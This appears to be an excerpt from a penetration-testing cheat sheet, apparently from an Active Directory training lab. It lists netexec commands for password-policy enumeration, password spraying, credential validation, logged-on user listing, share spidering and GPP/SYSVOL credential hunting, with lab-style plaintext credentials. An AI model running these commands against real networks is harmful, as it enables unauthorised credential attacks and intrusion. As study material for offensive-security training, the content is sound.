...
Uses `netexec`and valid credentials (`avazquez:Password123`) to enumerate the password policy (`--pass-pol`) from a Linux-based host.
...
Uses `netexec` and a list of users (`valid_users.txt`) to perform a password spraying attack against a target Windows domain from a Linux-based host. It also filters out logon failures using `grep`.

```
sudo netexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

Uses `netexec` to validate a set of credentials from a Linux-based host.

```
 sudo netexec smb 172.16.5.5 -u avazquez -p Password123
```
...
```
sudo netexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users
```
...
Authenticates with a Windows target over `smb` using valid credentials and utilizes the netexec module (`-M`) `spider_plus` to go through each readable share (`Dev-share`) and list all readable files.  The results are outputted in `JSON`. Performed from a Linux-based host.

```
sudo netexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share
```
...
Locates and retrieves a `group policy preference password` using `netexec`, the filters the output using `grep`. Peformed from a Linux-based host.

```
netexec smb -L | grep gpp
```

Locates and retrieves any credentials stored in the `SYSVOL` share of a Windows target using `netexec` from a Linux-based host.
